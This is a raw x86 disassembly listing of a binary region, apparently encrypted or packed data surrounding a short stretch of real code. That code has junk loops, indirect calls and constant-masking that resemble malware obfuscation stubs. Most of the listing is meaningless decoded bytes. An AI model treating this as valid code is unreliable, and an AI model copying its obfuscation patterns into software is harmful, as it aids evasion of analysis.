  41d323:	loope  0x41d2d1
  41d325:	cmp    esp,DWORD PTR [ebx]
  41d327:	xlat   BYTE PTR ds:[ebx]
  41d328:	add    al,0xb
  41d32a:	repz add BYTE PTR [edx-0x33],al
  41d32e:	jecxz  0x41d303
  41d330:	cmp    ecx,DWORD PTR [ebx]
  41d332:	xchg   edx,eax
  41d333:	cmp    esp,DWORD PTR [esi]
  41d335:	mov    ebx,0x6fbb7a84
  41d33a:	push   eax
  41d33b:	push   ecx
  41d33c:	leave  
  41d33d:	scas   eax,DWORD PTR es:[edi]
  41d33e:	pusha  
  41d33f:	lds    esi,FWORD PTR [esi-0x32143f8e]
  41d345:	dec    ecx
  41d346:	clc    
  41d347:	sbb    DWORD PTR [eax-0x31],esi
  41d34a:	nop
  41d34b:	retf   0x8122
  41d34e:	imul   ebx,edi,0x276b63ae
  41d354:	js     0x41d365
  41d356:	inc    ebx
  41d357:	add    bh,BYTE PTR [esi+0x27]
  41d35a:	(bad)  
  41d35b:	div    DWORD PTR [ebx-0x1a]
  41d35e:	(bad)  
  41d35f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d360:	shl    DWORD PTR [ebp+0x3b],0xaf
  41d364:	ja     0x41d3d5
  41d366:	lods   al,BYTE PTR ds:[esi]
  41d367:	dec    ebx
  41d368:	pop    ds
  41d369:	icebp  
  41d36a:	cld    
  41d36b:	cdq    
  41d36c:	cmp    ax,0x8eb2
  41d370:	arpl   sp,cx
  41d372:	and    al,0x77
  41d374:	dec    eax
  41d375:	push   eax
  41d376:	call   0x8c33:0x1582743a
  41d37d:	sub    BYTE PTR [eax-0x1f],ch
  41d380:	repz jae 0x41d314
  41d383:	clc    
  41d384:	jmp    0xd9163234
  41d389:	and    DWORD PTR [edx+0xa6613d7],ebp
  41d38f:	sbb    ecx,DWORD PTR [edi]
  41d391:	xor    bh,BYTE PTR [eax]
  41d393:	or     ch,BYTE PTR [edi-0x7969297c]
  41d399:	jb     0x41d3f9
  41d39b:	cdq    
  41d39c:	daa    
  41d39d:	pop    eax
  41d39e:	sbb    al,0xf6
  41d3a0:	sub    ebp,DWORD PTR [eax+0x78]
  41d3a3:	sahf   
  41d3a4:	ins    DWORD PTR es:[edi],dx
  41d3a5:	sti    
  41d3a6:	test   DWORD PTR [ebx-0x2ec10011],esp
  41d3ac:	pop    esi
  41d3ad:	and    edx,DWORD PTR [ebx+0x5a]
  41d3b0:	xchg   DWORD PTR [eax],edi
  41d3b2:	xor    ebx,DWORD PTR [ecx]
  41d3b4:	inc    ebx
  41d3b5:	(bad)  
  41d3b6:	jmp    0x1f18:0xb0559065
  41d3bd:	sbb    ch,al
  41d3bf:	pop    ecx
  41d3c0:	or     ch,al
  41d3c2:	sahf   
  41d3c3:	cmp    DWORD PTR [ebx+edx*4-0x40bf5ba3],edi
  41d3ca:	xchg   edi,eax
  41d3cb:	sbb    ecx,DWORD PTR [ebx+0x7a]
  41d3ce:	jne    0x41d3ad
  41d3d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3d1:	js     0x41d3ec
  41d3d3:	shr    DWORD PTR [ecx+ebx*8+0x29],1
  41d3d7:	jle    0x41d36a
  41d3d9:	jns    0x41d39e
  41d3db:	or     esi,DWORD PTR [ebp+edx*8+0x5befcce4]
  41d3e2:	bound  esi,QWORD PTR [ecx]
  41d3e4:	(bad)
  41d3e9:	inc    esi
  41d3ea:	jg     0x41d413
  41d3ec:	mov    cl,0x96
  41d3ee:	out    0x1f,al
  41d3f0:	das    
  41d3f1:	mov    eax,fs:0x3ced5b83
  41d3f7:	aaa    
  41d3f8:	ds inc edi
  41d3fa:	add    eax,0xf1b123fd
  41d3ff:	push   ebx
  41d400:	sbb    ecx,ebp
  41d402:	mov    gs,WORD PTR [esi+eiz*4-0x2a3e8144]
  41d409:	mov    al,0x28
  41d40b:	inc    eax
  41d40c:	(bad)  
  41d40d:	daa    
  41d40e:	fwait
  41d40f:	or     DWORD PTR [esi-0x5],ecx
  41d412:	(bad)  
  41d413:	loop   0x41d421
  41d415:	cmp    eax,DWORD PTR ds:0x6c9805f4
  41d41b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d41c:	outs   dx,BYTE PTR ds:[esi]
  41d41d:	in     al,dx
  41d41e:	mov    ebp,0xb67a81ad
  41d423:	inc    edi
  41d424:	(bad)  
  41d425:	mov    ds:0xe5ffc21c,eax
  41d42a:	int3   
  41d42b:	test   al,0xfb
  41d42d:	inc    ebp
  41d42e:	pop    es
  41d42f:	je     0x41d3e2
  41d431:	adc    ebx,DWORD PTR [eax+ebp*2]
  41d434:	mov    ecx,0xc624211
  41d439:	aas    
  41d43a:	enter  0x6dbe,0xb1
  41d43e:	scas   eax,DWORD PTR es:[edi]
  41d43f:	xchg   ecx,eax
  41d440:	pop    eax
  41d441:	repnz cmp DWORD PTR [eax],0x48fa5633
  41d448:	mov    bh,0xde
  41d44a:	cdq    
  41d44b:	jae    0x41d4a0
  41d44d:	rcr    DWORD PTR [edx+0xd615358],0xfe
  41d454:	sub    al,0x59
  41d456:	xchg   edi,eax
  41d457:	xchg   DWORD PTR [ebp-0x18eae006],esi
  41d45d:	cmp    eax,0x4d0a777b
  41d462:	cmp    al,0xe0
  41d464:	scas   al,BYTE PTR es:[edi]
  41d465:	not    BYTE PTR [ecx+0x69]
  41d468:	sbb    eax,0xdc3f3ce2
  41d46d:	pop    es
  41d46e:	jge    0x41d464
  41d470:	mov    esp,0x5ee0e011
  41d475:	push   0xeb7c9078
  41d47a:	pop    es
  41d47b:	pop    DWORD PTR [eax+0x40916389]
  41d481:	nop
  41d482:	mov    edx,0x3ec93dc4
  41d487:	jno    0x41d48c
  41d489:	clc    
  41d48a:	jo     0x41d42b
  41d48c:	(bad)  
  41d48d:	iret   
  41d48e:	pop    es
  41d48f:	jge    0x41d45b
  41d491:	or     dh,BYTE PTR [esi-0x31fc52b7]
  41d497:	retf   
  41d498:	xchg   BYTE PTR [esp+ebx*8],ch
  41d49b:	dec    ebx
  41d49c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d49d:	add    eax,0x53c6245d
  41d4a2:	js     0x41d4a2
  41d4a4:	add    eax,0x2e3c20b1
  41d4a9:	cmp    BYTE PTR [ebp-0x6dcd4870],0x5b
  41d4b0:	sub    ebx,DWORD PTR ds:0x43bb61b8
  41d4b6:	inc    edx
  41d4b7:	loop   0x41d4a7
  41d4b9:	(bad)  
  41d4bb:	ret    
  41d4bc:	push   0x2ea905b0
  41d4c1:	xchg   ebx,eax
  41d4c2:	int3   
  41d4c3:	and    eax,0xbbe8f362
  41d4c8:	add    edi,DWORD PTR [esi-0x75]
  41d4cb:	adc    al,0x6e
  41d4cd:	ds das 
  41d4cf:	inc    edi
  41d4d0:	clc    
  41d4d1:	push   ds
  41d4d2:	add    ecx,DWORD PTR [ebx-0x23610b66]
  41d4d8:	cmp    al,0x3f
  41d4da:	test   al,0xa5
  41d4dc:	retf   0x5838
  41d4df:	adc    eax,0x1253e8b4
  41d4e4:	mov    bl,0x2b
  41d4e6:	test   cl,al
  41d4e8:	into   
  41d4e9:	pop    esi
  41d4ea:	lahf   
  41d4eb:	(bad)  
  41d4ec:	ror    esi,1
  41d4ee:	mov    bl,0x23
  41d4f0:	jno    0x41d48d
  41d4f2:	inc    eax
  41d4f3:	mov    ebp,0x3f81469b
  41d4f8:	ds popa 
  41d4fa:	mov    bh,0xd6
  41d4fc:	mov    esi,0xfbbb100a
  41d501:	test   DWORD PTR [eax],0xbaaf8827
  41d507:	loopne 0x41d4f8
  41d509:	push   0x63ce905e
  41d50e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d50f:	xor    BYTE PTR [edi-0x3e633a83],ch
  41d515:	push   edx
  41d516:	pop    ecx
  41d517:	loopne 0x41d558
  41d519:	call   0x89081384
  41d51e:	jmp    0x41d560
  41d520:	and    ebp,DWORD PTR [ebx+0x32]
  41d523:	(bad)  
  41d524:	mov    ebp,0x368f96c3
  41d529:	fadd   DWORD PTR ds:0xd67f42e0
  41d52f:	sub    al,0x3a
  41d531:	pop    ss
  41d532:	test   DWORD PTR [edx+ecx*2+0x3504ce3],ecx
  41d539:	cmp    dl,BYTE PTR ds:0xcc121062
  41d53f:	rcr    BYTE PTR [edi+0x4c],1
  41d542:	mov    al,ds:0x3154c555
  41d547:	pop    ds
  41d548:	cmp    edx,DWORD PTR [esi]
  41d54a:	shl    BYTE PTR [edx+0x8bc66a9],cl
  41d550:	daa    
  41d551:	nop
  41d552:	pop    esp
  41d553:	mov    bl,BYTE PTR [edi+ecx*2-0x30bc7408]
  41d55a:	fistp  QWORD PTR [esi+ecx*8+0x3b2e427b]
  41d561:	xchg   esi,eax
  41d562:	in     eax,dx
  41d563:	inc    edx
  41d564:	push   ebp
  41d565:	or     edi,DWORD PTR [edx]
  41d567:	cwde   
  41d568:	inc    eax
  41d569:	imul   edx,DWORD PTR [edx],0x6e9acfe
  41d56f:	inc    DWORD PTR [esi+0x45]
  41d572:	dec    ecx
  41d573:	sub    DWORD PTR [edx-0x7c],ebp
  41d576:	out    dx,al
  41d577:	repz cmp DWORD PTR [ecx-0x2be532e8],edi
  41d57e:	xchg   ecx,eax
  41d57f:	stc    
  41d580:	test   edi,edi
  41d582:	ficomp DWORD PTR ds:0xed2791e9
  41d588:	dec    eax
  41d58a:	fwait
  41d58b:	mov    ah,0xc9
  41d58d:	lock xor al,0x1a
  41d590:	addr16 aaa 
  41d592:	mov    ah,bl
  41d594:	lods   eax,DWORD PTR ds:[esi]
  41d595:	dec    edi
  41d596:	cmp    DWORD PTR [ebp-0x31],edi
  41d599:	and    ecx,edi
  41d59b:	jmp    0x8eca:0x43248810
  41d5a2:	pop    eax
  41d5a3:	push   es
  41d5a4:	mov    esp,0x17fe5677
  41d5a9:	test   BYTE PTR [ebp+0x278c2648],bl
  41d5af:	xchg   BYTE PTR [esi+0x4],bh
  41d5b2:	in     al,dx
  41d5b3:	xchg   edx,eax
  41d5b4:	fneni(8087 only) 
  41d5b6:	shl    BYTE PTR [ecx-0x6766a1a3],0x99
  41d5bd:	mov    al,ds:0x4a2c1496
  41d5c2:	in     eax,dx
  41d5c3:	addr16 cdq 
  41d5c5:	in     eax,0x3b
  41d5c7:	popa   
  41d5c8:	das    
  41d5c9:	fcom   DWORD PTR [eax]
  41d5cb:	pop    es
  41d5cc:	pop    ebx
  41d5cd:	loopne 0x41d5bf
  41d5cf:	sub    ecx,esp
  41d5d1:	(bad)  
  41d5d2:	adc    BYTE PTR [edx+0x1d1e80b2],bl
  41d5d8:	jmp    0xd54118a7
  41d5dd:	pop    esp
  41d5de:	jne    0x41d5f3
  41d5e0:	iret   
  41d5e1:	or     al,BYTE PTR [eax]
  41d5e3:	out    0x2a,eax
  41d5e5:	fucomp st(6)
  41d5e7:	pop    ebx
  41d5e8:	xor    bl,cl
  41d5ea:	mov    al,0x3f
  41d5ec:	aas    
  41d5ed:	cmp    edi,0xac55df9c
  41d5f3:	cmp    BYTE PTR [ecx+0x59],al
  41d5f6:	fdiv   QWORD PTR [ebx]
  41d5f8:	stc    
  41d5f9:	bound  eax,QWORD PTR [edi-0x7d5c11a4]
  41d5ff:	push   ebp
  41d600:	in     al,dx
  41d601:	push   ebp
  41d602:	iret   
  41d603:	call   FWORD PTR [ecx]
  41d605:	adc    al,0x3c
  41d607:	lock jo 0x41d689
  41d60a:	adc    BYTE PTR [ecx+0x5d392603],bh
  41d610:	lea    ecx,[edx+ecx*1+0x241fcde]
  41d617:	mov    DWORD PTR [ebp-0x48],ecx
  41d61a:	mov    ecx,DWORD PTR [ebp+0x8]
  41d61d:	mov    edx,0xfa5e1521
  41d622:	sub    edx,ecx
  41d624:	add    edx,DWORD PTR [ebp-0x44]
  41d627:	mov    DWORD PTR [ebp-0x44],edx
  41d62a:	mov    ecx,DWORD PTR [ebp+0x8]
  41d62d:	xor    ecx,eax
  41d62f:	add    ecx,esi
  41d631:	jne    0x41b215
  41d637:	mov    ecx,DWORD PTR [ebp-0x8]
  41d63a:	xor    ecx,eax
  41d63c:	mov    eax,DWORD PTR [ebp+0x10]
  41d63f:	add    ecx,esi
  41d641:	mov    DWORD PTR [eax],ecx
  41d643:	pop    edi
  41d644:	pop    esi
  41d645:	pop    ebx
  41d646:	leave  
  41d647:	ret    0xc
  41d64a:	push   ebp
  41d64b:	mov    ebp,esp
  41d64d:	sub    esp,0x7c
  41d650:	or     ecx,0x868
  41d656:	push   esi
  41d657:	and    DWORD PTR ds:0x42862f,0x0
  41d661:	jmp    0x41d674
  41d666:	xor    eax,eax
  41d668:	or     eax,DWORD PTR ds:0x42862f
  41d66e:	inc    eax
  41d66f:	mov    ds:0x42862f,eax
  41d674:	cmp    DWORD PTR ds:0x42862f,0x1b
  41d67b:	jae    0x41d6a6
  41d681:	cmp    DWORD PTR ds:0x42862f,0x24
  41d688:	jbe    0x41d6a6
  41d68e:	jmp    0x41d6a1
  41d693:	push   DWORD PTR [ebp-0x28]
  41d696:	push   0x42865b
  41d69b:	call   DWORD PTR ds:0x4287b3
  41d6a1:	jmp    0x41d666
  41d6a6:	push   edi
  41d6a7:	mov    eax,ds:0x4282ef
  41d6ac:	mov    DWORD PTR ds:0x42866f,0x15
  41d6b6:	cmp    DWORD PTR ds:0x42866f,0x0
  41d6bd:	je     0x41d6ed
  41d6c3:	cmp    DWORD PTR ds:0x42866f,0x1f
  41d6ca:	jl     0x41d6ed
  41d6d0:	jmp    0x41d6db
  41d6d5:	call   DWORD PTR ds:0x4287b7
  41d6db:	mov    ecx,DWORD PTR ds:0x42866f
  41d6e1:	dec    ecx
  41d6e2:	mov    DWORD PTR ds:0x42866f,ecx
  41d6e8:	jmp    0x41d6b6
  41d6ed:	mov    DWORD PTR [ebp-0x24],eax
  41d6f0:	xor    eax,eax
  41d6f2:	add    eax,DWORD PTR ds:0x42868b
  41d6f8:	mov    edi,DWORD PTR ds:0x428707
  41d6fe:	sub    eax,edi
  41d700:	xor    eax,DWORD PTR [eax+edi*1]
  41d703:	mov    eax,ds:0x4283fb
  41d708:	not    DWORD PTR ds:0x428613
  41d70e:	mov    DWORD PTR [ebp-0x34],eax
  41d711:	and    DWORD PTR [ebp-0x30],0x0
  41d715:	sub    esi,0x14f1
  41d71b:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  41d722:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  41d729:	xor    edi,edi
  41d72b:	mov    eax,DWORD PTR [ebp-0x10]
  41d72e:	mov    esi,DWORD PTR ds:0x42860b
  41d734:	add    DWORD PTR ds:0x428653,esi
  41d73a:	mov    ecx,DWORD PTR [ebp-0x10]
  41d73d:	mov    DWORD PTR ds:0x42860f,0x19
  41d747:	cmp    DWORD PTR ds:0x42860f,0x0
  41d74e:	je     0x41d783
  41d754:	cmp    DWORD PTR ds:0x42860f,0x24
  41d75b:	jge    0x41d783
  41d761:	jmp    0x41d76f
  41d766:	push   DWORD PTR [ebp-0x14]
  41d769:	call   DWORD PTR ds:0x4287bb
  41d76f:	xor    edi,edi
  41d771:	xor    edi,DWORD PTR ds:0x42860f
  41d777:	dec    edi
  41d778:	mov    DWORD PTR ds:0x42860f,edi
  41d77e:	jmp    0x41d747
  41d783:	sub    eax,ecx
  41d785:	add    DWORD PTR ds:0x42865b,ecx
  41d78b:	mov    DWORD PTR [ebp-0x10],eax
  41d78e:	sub    edi,edi
  41d790:	xor    DWORD PTR [ebp-0x10],0xf89cb5b0
  41d797:	mov    edi,DWORD PTR ds:0x42862b
  41d79d:	adc    edi,DWORD PTR ds:0x42864b
  41d7a3:	mov    DWORD PTR ds:0x42862b,edi
  41d7a9:	mov    eax,DWORD PTR [ebp-0x18]
  41d7ac:	inc    edi
  41d7ad:	mov    ecx,DWORD PTR [ebp-0x18]
  41d7b0:	and    DWORD PTR ds:0x42862f,0x0
  41d7ba:	mov    esi,DWORD PTR ds:0x42862f
  41d7c0:	inc    esi
  41d7c1:	mov    DWORD PTR ds:0x42862f,esi
  41d7c7:	cmp    DWORD PTR ds:0x42862f,0x21
  41d7ce:	jb     0x41d804
  41d7d4:	jmp    0x41d7f7
  41d7d9:	push   0x2450
  41d7de:	push   0x4280ae
  41d7e3:	push   DWORD PTR [ebp-0x20]
  41d7e6:	push   0x428083
  41d7eb:	push   DWORD PTR [ebp-0x18]
  41d7ee:	push   DWORD PTR [ebp-0x28]
  41d7f1:	call   DWORD PTR ds:0x4287bf
  41d7f7:	cmp    DWORD PTR ds:0x42862f,0x1d
  41d7fe:	jb     0x41d7ba
  41d804:	sub    eax,ecx
  41d806:	mov    DWORD PTR ds:0x428667,0x2f20
  41d810:	mov    DWORD PTR [ebp-0x18],eax
  41d813:	or     DWORD PTR [ebp-0x18],0xf89f05b0
  41d81a:	sbb    edi,edi
  41d81c:	mov    eax,DWORD PTR [ebp-0xc]
  41d81f:	xor    ecx,ecx
  41d821:	or     ecx,DWORD PTR ds:0x428697
  41d827:	mov    esi,DWORD PTR ds:0x42869f
  41d82d:	sub    ecx,esi
  41d82f:	or     ecx,DWORD PTR [ecx+esi*1]
  41d832:	mov    ecx,DWORD PTR [ebp-0xc]
  41d835:	sub    eax,ecx
  41d837:	and    DWORD PTR ds:0x42863b,0x0
  41d841:	jmp    0x41d853
  41d846:	mov    esi,DWORD PTR ds:0x42863b
  41d84c:	inc    esi
  41d84d:	mov    DWORD PTR ds:0x42863b,esi
  41d853:	cmp    DWORD PTR ds:0x42863b,0x16
  41d85a:	jae    0x41d89c
  41d860:	cmp    DWORD PTR ds:0x42863b,0x9
  41d867:	jle    0x41d89c
  41d86d:	jmp    0x41d87d
  41d872:	push   0x428083
  41d877:	call   DWORD PTR ds:0x4287c3
  41d87d:	cmp    DWORD PTR ds:0x42863b,0x8
  41d884:	jne    0x41d897
  41d88a:	mov    esi,DWORD PTR ds:0x42863b
  41d890:	inc    esi
  41d891:	mov    DWORD PTR ds:0x42863b,esi
  41d897:	jmp    0x41d846
  41d89c:	mov    DWORD PTR [ebp-0xc],eax
  41d89f:	or     DWORD PTR [ebp-0xc],0xf89c85f0
  41d8a6:	mov    eax,DWORD PTR [ebp-0x1c]
  41d8a9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d8ac:	sub    eax,ecx
  41d8ae:	mov    DWORD PTR [ebp-0x1c],eax
  41d8b1:	or     DWORD PTR [ebp-0x1c],0xf89c8590
  41d8b8:	mov    eax,DWORD PTR [ebp-0x20]
  41d8bb:	mov    ecx,DWORD PTR [ebp-0x20]
  41d8be:	sub    eax,ecx
  41d8c0:	mov    DWORD PTR [ebp-0x20],eax
  41d8c3:	mov    eax,DWORD PTR [ebp-0x2c]
  41d8c6:	mov    ecx,DWORD PTR [ebp-0x20]
  41d8c9:	mov    esi,0x75108a4
  41d8ce:	xor    eax,esi
  41d8d0:	mov    edi,0x3272ec
  41d8d5:	add    eax,edi
  41d8d7:	or     eax,ecx
  41d8d9:	mov    DWORD PTR [ebp-0x20],eax
  41d8dc:	mov    eax,DWORD PTR [ebp-0x4]
  41d8df:	mov    ecx,DWORD PTR [ebp-0x4]
  41d8e2:	sub    eax,ecx
  41d8e4:	mov    DWORD PTR [ebp-0x4],eax
  41d8e7:	or     DWORD PTR [ebp-0x4],0xf89c85bd
  41d8ee:	mov    eax,DWORD PTR [ebp-0xc]
  41d8f1:	xor    eax,esi
  41d8f3:	add    eax,edi
  41d8f5:	push   eax
  41d8f6:	mov    eax,DWORD PTR [ebp-0x10]
  41d8f9:	xor    eax,esi
  41d8fb:	add    eax,edi
  41d8fd:	push   eax
  41d8fe:	mov    eax,DWORD PTR [ebp-0x4]
  41d901:	xor    eax,esi
  41d903:	add    eax,edi
  41d905:	push   eax
  41d906:	lea    eax,[ebp-0x7c]
  41d909:	push   eax
  41d90a:	push   DWORD PTR [ebp-0x2c]
  41d90d:	push   DWORD PTR [ebp-0x28]
  41d910:	call   0x40f37f
  41d915:	test   eax,eax
  41d917:	je     0x41fca5
  41d91d:	lea    eax,[ebp-0x7c]
  41d920:	push   eax
  41d921:	mov    eax,DWORD PTR [ebp-0x28]
  41d924:	jmp    0x41fc84
  41d929:	fs popa 
  41d92b:	dec    eax
  41d92c:	mov    cs,WORD PTR [ebx+0x7b]
  41d92f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d930:	jnp    0x41d8c9
  41d932:	rol    edx,1
  41d934:	aaa    
  41d935:	xor    dh,BYTE PTR [edx]
  41d937:	jmp    0x7e16035a
  41d93c:	jp     0x41d97d
  41d93e:	pop    edi
  41d93f:	jp     0x41d9bb
  41d941:	xchg   esi,eax
  41d942:	nop
  41d943:	mov    esp,0x85a6f1d2
  41d948:	in     al,dx
  41d949:	adc    BYTE PTR [ebx-0x56],al
  41d94c:	pop    ds
  41d94d:	jbe    0x41d953
  41d94f:	adc    esi,ebp
  41d951:	call   0x71dc:0x358039ab
  41d958:	daa    
  41d959:	sub    BYTE PTR [ecx+0x6308b36c],bh
  41d95f:	int3   
  41d960:	push   ds
  41d961:	jl     0x41d98d
  41d963:	mov    esi,0x210af096
  41d968:	mov    esi,0xa68364ba
  41d96d:	and    eax,0x87f5c167
  41d972:	into   
  41d973:	and    DWORD PTR [ecx+0x6f],eax
  41d976:	hlt    
  41d977:	pushf  
  41d978:	add    bh,0x62
  41d97b:	out    0xc0,eax
  41d97d:	into   
  41d97e:	pusha  
  41d97f:	adc    al,0x3c
  41d981:	lea    ebp,[edi+ebx*8+0x9165841]
  41d988:	retf   
  41d989:	inc    eax
  41d98a:	fmul   DWORD PTR [esi-0x7e71c4cb]
  41d990:	popa   
  41d991:	jb     0x41d960
  41d993:	mov    ebx,0xa9f7705
  41d998:	push   es
  41d999:	or     bl,al
  41d99b:	add    BYTE PTR gs:[ecx+0x4a5169bb],dl
  41d9a2:	cmp    eax,0x8c0273f8
  41d9a7:	cdq    
  41d9a8:	retf   
  41d9a9:	outs   dx,DWORD PTR ds:[esi]
  41d9aa:	sti    
  41d9ab:	daa    
  41d9ac:	dec    edx
  41d9ad:	mov    ah,0x3
  41d9af:	lock lods eax,DWORD PTR ds:[esi]
  41d9b1:	cmp    BYTE PTR [ebx+eax*4],bh
  41d9b4:	sbb    eax,0xf9793448
  41d9b9:	jbe    0x41d974
  41d9bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9bc:	(bad)  
  41d9be:	scas   al,BYTE PTR es:[edi]
  41d9bf:	sbb    ebp,DWORD PTR [eax]
  41d9c1:	nop
  41d9c2:	test   DWORD PTR [ebx-0x7ff4e009],eax
  41d9c8:	jmp    0x5b286dc
  41d9cd:	pop    esp
  41d9ce:	lock inc ebp
  41d9d0:	fnsave [esi]
  41d9d2:	mov    esi,0x7a8f0d44
  41d9d7:	xchg   esp,eax
  41d9d8:	mov    dl,0x7a
  41d9da:	outs   dx,BYTE PTR ds:[esi]
  41d9db:	jmp    0xa8bcaf59
  41d9e0:	rcl    ah,1
  41d9e2:	dec    ebp
  41d9e3:	inc    ebx
  41d9e4:	mov    al,ds:0xe4084f5c
  41d9e9:	dec    eax
  41d9ea:	push   0x16
  41d9ec:	mov    ah,0x7c
  41d9ee:	dec    esi
  41d9ef:	xchg   esp,eax
  41d9f0:	out    dx,al
  41d9f1:	jns    0x41da44
  41d9f3:	mov    ah,0xc3
  41d9f5:	cmc    
  41d9f6:	xor    DWORD PTR [edx-0x308c9150],eax
  41d9fc:	jno    0x41d99c
  41d9fe:	ds int3 
  41da00:	add    ecx,DWORD PTR ds:0xe551840
  41da06:	sub    BYTE PTR [eax-0x63fec927],0xef
  41da0d:	sbb    al,0xe3
  41da0f:	test   al,0xcd
  41da11:	xor    eax,0xe45b7091
  41da16:	push   ebx
  41da17:	sbb    ch,BYTE PTR [eax-0x1650b67f]
  41da1d:	(bad)  
  41da1e:	hlt    
  41da1f:	pop    edx
  41da20:	imul   BYTE PTR [edx]
  41da22:	push   edi
  41da23:	stos   BYTE PTR es:[edi],al
  41da24:	dec    eax
  41da25:	add    ah,BYTE PTR [ecx-0x40]
  41da28:	pop    ss
  41da29:	lock repz mov ch,0xbc
  41da2d:	stos   BYTE PTR es:[edi],al
  41da2e:	pop    ss
  41da2f:	mov    ebp,0xdeee76f
  41da34:	push   edi
  41da35:	push   es
  41da36:	aaa    
  41da37:	mov    ch,0xb4
  41da39:	and    al,al
  41da3b:	xchg   ecx,eax
  41da3c:	dec    esp
  41da3d:	mov    eax,0xbe4de5c5
  41da42:	xchg   edx,eax
  41da43:	push   0xfffffff8
  41da45:	jg     0x41da14
  41da47:	mov    ds:0xfd435a16,eax
  41da4c:	dec    ebp
  41da4d:	scas   al,BYTE PTR es:[edi]
  41da4e:	sbb    al,0xf0
  41da50:	xor    eax,0xfc0a9c3d
  41da55:	adc    BYTE PTR [ecx+0x6f],al
  41da58:	sti    
  41da59:	bound  esp,QWORD PTR [edi]
  41da5b:	test   DWORD PTR [edi+0x2d],0xbc5d4de7
  41da62:	push   cs
  41da63:	sub    ch,cl
  41da65:	cdq    
  41da66:	mov    ecx,0x8c5710ae
  41da6b:	jecxz  0x41da31
  41da6d:	rcr    BYTE PTR [ebp-0x7d],1
  41da70:	dec    ecx
  41da71:	imul   eax,DWORD PTR [edi+0x31690f71],0x28a65cea
  41da7b:	mov    ds:0x71add3c0,eax
  41da80:	xchg   esi,eax
  41da81:	test   DWORD PTR [esi+0x6a583152],esi
  41da87:	dec    ebx
  41da88:	test   cl,dl
  41da8a:	mov    ebp,0x9d50a3c9
  41da8f:	scas   eax,DWORD PTR es:[edi]
  41da90:	mov    ds:0x50a5fe4e,al
  41da95:	pusha  
  41da96:	mov    esp,0xecdd80f7
  41da9b:	idiv   bl
  41da9d:	fidiv  DWORD PTR [edx+0x41]
  41daa0:	rcr    BYTE PTR [edi+0x65],1
  41daa3:	ss dec bp
  41daa6:	sbb    DWORD PTR [ecx-0x33],0x21
  41daaa:	cmc    
  41daab:	aas    
  41daac:	sar    DWORD PTR [eiz*1+0x70e79a28],cl
  41dab3:	hlt    
  41dab4:	mov    ds:0xce349312,eax
  41dab9:	pushw  ds
  41dabb:	mov    dh,0x7a
  41dabd:	or     eax,0x49b7313e
  41dac2:	(bad)  
  41dac3:	cmp    eax,0xd634745c
  41dac8:	xor    DWORD PTR [esi],ebp
  41daca:	mov    ecx,0xc8b499b0
  41dacf:	dec    esi
  41dad0:	shl    al,cl
  41dad2:	sbb    ch,cl
  41dad4:	push   ecx
  41dad5:	mov    edx,0x3311ea75
  41dada:	imul   esp,DWORD PTR [eax],0x72fa87d
  41dae0:	push   ecx
  41dae1:	bound  ecx,QWORD PTR [edx]
  41dae3:	sahf   
  41dae4:	or     ebx,eax
  41dae6:	repz aam 0x32
  41dae9:	sub    al,al
  41daeb:	mov    DWORD PTR [esi-0x26],eax
  41daee:	aaa    
  41daef:	xchg   edx,eax
  41daf0:	dec    edx
  41daf1:	jbe    0x41db07
  41daf3:	dec    edx
  41daf4:	inc    edi
  41daf5:	and    DWORD PTR [eax],esi
  41daf7:	ret    0xf18b
  41dafa:	out    0x49,al
  41dafc:	into   
  41dafd:	and    dh,BYTE PTR [ebx]
  41daff:	cmp    bl,dl
  41db01:	jl     0x41db22
  41db03:	inc    edi
  41db04:	push   esp
  41db05:	or     ah,BYTE PTR ds:0xdf2d0442
  41db0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db0c:	idiv   BYTE PTR [ebx]
  41db0e:	daa    
  41db0f:	je     0x41daac
  41db11:	add    eax,0xd2514dbe
  41db16:	sti    
  41db17:	mov    al,ds:0xb25c9aeb
  41db1c:	sahf   
  41db1d:	outs   dx,DWORD PTR ds:[esi]
  41db1e:	mov    dl,0x3c
  41db20:	sbb    ch,bl
  41db22:	ins    BYTE PTR es:[edi],dx
  41db23:	jmp    0x41dada
  41db25:	adc    esp,DWORD PTR [edx+0x76eefb00]
  41db2b:	push   eax
  41db2c:	pop    ds
  41db2d:	pop    ds
  41db2e:	aaa    
  41db2f:	adc    ch,BYTE PTR [ebx]
  41db31:	pusha  
  41db32:	fnstenv [ecx-0x2b94adef]
  41db38:	inc    edi
  41db39:	lods   al,BYTE PTR ds:[esi]
  41db3a:	out    dx,al
  41db3b:	popf   
  41db3c:	inc    eax
  41db3d:	ret    
  41db3e:	sub    BYTE PTR [edi+0x3e333da2],dh
  41db44:	jno    0x41db4f
  41db46:	push   ss
  41db47:	inc    ecx
  41db48:	hlt    
  41db49:	into   
  41db4a:	lock jne 0x41db1c
  41db4d:	push   ebx
  41db4e:	dec    eax
  41db4f:	das    
  41db50:	mov    eax,ds:0x92cd249a
  41db55:	(bad)  
  41db57:	sbb    al,0x12
  41db59:	je     0x41db67
  41db5b:	or     esp,DWORD PTR [edi-0x2]
  41db5e:	jno    0x41dbbe
  41db60:	fcompp 
  41db62:	xchg   esp,eax
  41db63:	mov    bl,0x35
  41db65:	dec    ebx
  41db66:	(bad)  
  41db67:	pop    ecx
  41db68:	mov    eax,ds:0xeea65560
  41db6d:	repz and bh,cl
  41db70:	mov    ds:0xe48931f4,eax
  41db75:	pop    ss
  41db76:	imul   ecx,DWORD PTR [eax-0x9d18e88],0x82fd792
  41db80:	shl    DWORD PTR [ebx+0x22c8617d],1
  41db86:	ja     0x41dbda
  41db88:	dec    ecx
  41db89:	jns    0x41dbbc
  41db8b:	aad    0xe6
  41db8d:	adc    eax,0x4d3b10b5
  41db92:	cmp    bl,BYTE PTR [esi+0x5d]
  41db95:	and    bh,BYTE PTR [edi+esi*4-0x33dfb917]
  41db9c:	cwde   
  41db9d:	dec    ebp
  41db9e:	pop    ss
  41db9f:	push   0xfa83235d
  41dba4:	int    0x28
